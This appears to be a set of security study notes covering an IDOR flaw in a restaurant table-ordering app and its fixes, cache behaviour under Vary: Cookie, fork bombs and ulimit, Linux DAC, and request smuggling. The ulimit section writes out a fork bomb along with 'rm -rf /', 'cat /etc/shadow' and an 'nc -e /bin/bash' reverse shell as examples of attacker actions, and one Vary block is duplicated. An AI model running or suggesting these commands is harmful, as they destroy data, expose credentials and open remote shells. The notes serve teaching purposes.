
## Beer Bounty 

**The core problem:**

```
GET /table?id=42    ← client controls this number
GET /table?id=43    ← just change it, see another table
```

Server trusted the client-supplied number with zero validation.

---

**Fix 1: Server-side session binding (most important)**

When QR code is scanned, server creates a session:

```
QR scan → server creates: {
    session_token: "x9kL2mP...",  
    bound_table: 42,              ← stored SERVER side
    expires: 2hrs
}
```

Now every subsequent request:

```python
# Server checks:
if request.session["bound_table"] != requested_table:
    return 403 Forbidden
```

Client never sends the table number again — server already knows which table that session belongs to.

---

**Fix 2: Unguessable tokens instead of sequential IDs**

Instead of:

```
/table?id=42    ← trivially guessable
/table?id=43
/table?id=44
```

Use:

```
/table?token=x9kL2mPqR7vN...   ← 256-bit random token
```

But as the author correctly pointed out — **token alone isn't enough authorization**. It's just harder to guess. A determined attacker could still find it. Must be combined with Fix 1.

---

**Fix 3: Authorize every single action**

Not just viewing — every state-changing action needs the same check:

```python
def add_item(request):
    # Check EVERY time, not just on initial load
    if request.session["bound_table"] != request.table_id:
        return 403
    
def checkout(request):
    if request.session["bound_table"] != request.table_id:
        return 403
```

The bug here was that the table context carried into state-changing actions — meaning authorization was never checked at all on those endpoints.

---

**Fix 4: Cache headers for sensitive responses**

As the author suspected — these responses must never be cached:

```
Cache-Control: no-store, private
```

Without this, table 42's order details could get cached and accidentally served to table 43's browser. Given you've seen CPDoS attacks in your lab, you know exactly how dangerous misconfigured caching gets.

---

**Root cause framing:**

Honestly all four things the author listed were true simultaneously:

- Missing server-side authorization ← **most critical**
- Client-controlled context became authoritative ← **design flaw**
- Nobody tested parameter tampering ← **QA gap**
- Shipped without threat modeling ← **process failure**

But the one that enabled everything else was the design decision to let the client tell the server which table it was. **The server should never trust the client to identify itself.**


## **What is the Vary header?**

It tells the cache: **"store different versions of this response based on these request headers"**

```
Vary: Accept-Encoding
```

Means: cache a different copy for each `Accept-Encoding` value:

- One copy for `gzip`
- One copy for `deflate`
- One copy for `br`

```
Vary: Cookie
```

Means: cache a different copy for **each unique cookie value** — so user A and user B get their own cached versions.


**What Vary: Cookie actually means for caching:**

```
Vary: Cookie means:
"cache a separate response for each UNIQUE cookie value"

Visitor with no cookie    → cache slot A
Visitor with cookie=abc   → cache slot B  
Visitor with cookie=xyz   → cache slot C
```

**What Vary: Cookie actually means for caching:**

```
Vary: Cookie means:
"cache a separate response for each UNIQUE cookie value"

Visitor with no cookie    → cache slot A
Visitor with cookie=abc   → cache slot B  
Visitor with cookie=xyz   → cache slot C
```

Vary: Cookie would matter IF:
─────────────────────────────
Every victim had their own unique cookie
→ each victim = separate cache slot
→ you'd have to poison EVERY slot individually
→ practically impossible
→ attack fails

Vary: Cookie doesn't matter BECAUSE:
─────────────────────────────────────
Victims have NO cookie on target page
→ ALL victims share ONE "no cookie" slot
→ poison that one slot
→ EVERYONE gets poisoned
→ attack works ✅


## What is a fork bomb?**

bash

```bash
:(){ :|:& };:
```

Breaking this down:

bash

```bash
:()     # define a function called ":"
{       # function body:
  :|:&  # call itself, pipe to another copy of itself, run in background
};      # end function
:       # execute it
```

It just **endlessly spawns copies of itself** until the system runs out of processes and crashes. It's a DoS against your own system basically.

## What is ulimit?

A Linux mechanism to **limit resources per process:**

bash

```bash
ulimit -u 100    # max 100 processes for this user
ulimit -m 512000 # max 512MB memory
```

The OP's thought was:

```
fork bomb spawns processes
→ ulimit caps max processes
→ bomb can't spawn infinitely
→ system saved?
```

## **Why ulimit doesn't matter here — Kaan's point:**

If attacker has **root + system()** they can just:

bash

```bash
ulimit -u unlimited    # remove the limit entirely
# then fork bomb
# OR more usefully:
rm -rf /              # delete everything
cat /etc/shadow       # steal all passwords
nc -e /bin/bash ...   # open reverse shell
```

---

**The threat model issue:**

```
OP's concern:
root system() → fork bomb → crash system
              → ulimit saves it?

Reality:
root system() → you already lost EVERYTHING
              → fork bomb is the least scary thing
              → attacker has full control
```

## DAC 
**In Linux files, it's clean and classic DAC:**

```
-rwxr--r-- 1 tanishka users file.txt
```

```
tanishka (owner) decides:
→ I get rwx
→ group gets r only
→ others get r only
→ I can chmod to change this anytime
```

Owner has full control over the policy. Textbook DAC.

---

**For processes it gets messier — Kaan's point:**

With files:

```
You own file.txt → you decide who can read/write/execute it
→ clear ownership → clear policy control
```

With processes:

```
You own process X → but you can't really SET a policy on it
→ you can't say "only user A can kill this process"
→ you can't say "only user B can ptrace this process"
→ the rules are fixed by the OS, not you
```

So DAC's "owner decides policy" part **breaks down** for processes.

**But your instinct is still right — DAC principles DO apply to processes:**

```
kill signal    → only your own processes
ptrace         → only your own processes
nice/renice    → only your own processes
```

These are all **identity based decisions** exactly like DAC — just without the "owner sets the policy" part.

## HTTP Request Smuggling 

Do you think request smuggling is fundamentally an HTTP problem, or is it just one instance of a broader class of distributed-parser inconsistency vulnerabilities that will keep reappearing regardless of protocol?

**Request smuggling's actual root cause:**

It's not really about HTTP specifically. It's about this:

Client → Proxy → Backend

Three different systems parsing the SAME data
→ each with slightly different interpretation rules
→ attacker exploits the GAP between interpretations


CL.TE:
Frontend reads Content-Length → sees one request boundary
Backend reads Transfer-Encoding → sees different boundary
→ gap exploited


CPDoS (what you did in The Den™):

HHO/HMO:
Your browser sends oversized/malformed header
CDN/cache parses it one way → caches the error
Origin server would parse it differently
→ gap exploited


The root cause isn't HTTP — it's **fundamental to distributed systems:**

Distributed systems require:
→ multiple components
→ each component must parse/interpret data
→ perfect parsing consistency is nearly impossible
→ specs are ambiguous
→ implementations differ
→ legacy compatibility requirements
→ GAP always exists somewhere